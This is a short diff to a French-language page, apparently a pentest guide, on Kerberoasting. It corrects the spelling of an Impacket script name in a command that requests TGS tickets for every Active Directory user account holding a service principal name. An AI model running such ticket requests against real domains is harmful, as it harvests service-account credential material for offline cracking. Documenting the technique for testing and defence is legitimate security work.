@@ -5,7 +5,7 @@ Un utilisateur de l’Active Directory peut demander un TGS pour n’importe que
 ### Récupération des tickets TGS
 
 ```
-GetUsersSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
+GetUserSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
 ```
 
 Cette commande va recenser tous les comptes utilisateur (non machine) exécutant un service (attribut `ServicePrincipalName` non vide) pour émettre une demande de ticket TGS en leur nom. Ces tickets seront ensuite affichés.
